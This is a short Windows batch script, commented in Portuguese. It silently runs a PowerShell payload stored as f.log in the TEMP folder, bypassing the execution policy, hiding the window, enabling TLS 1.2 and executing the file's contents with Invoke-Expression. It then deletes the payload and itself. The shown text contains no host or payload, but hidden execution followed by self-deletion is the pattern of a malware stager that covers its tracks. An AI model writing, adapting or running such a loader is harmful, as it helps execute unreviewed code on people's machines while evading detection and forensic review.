@echo off
set "f=%TEMP%\f.log"
:: Força a execução sem carregar perfis e com TLS 1.2
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$s=Get-Content '%f%' -Raw; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex $s"
del "%f%"
del "%~f0"
